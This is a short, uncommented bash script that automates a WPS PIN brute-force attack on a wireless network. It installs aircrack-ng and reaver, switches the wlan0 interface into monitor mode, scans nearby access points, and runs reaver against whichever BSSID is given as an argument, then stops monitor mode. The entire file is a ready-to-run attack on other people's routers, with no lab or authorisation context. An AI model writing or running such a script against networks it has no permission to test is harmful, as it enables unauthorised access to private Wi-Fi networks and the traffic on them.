#!/bin/bash
sudo apt-get install aircrack-ng reaver 
iwconfig

sudo airmon-ng start wlan0

sudo airodump-ng mon0

sudo reaver -i mon0 -b $1 -vv 


sudo airmon-ng stop wlan0
exit 0
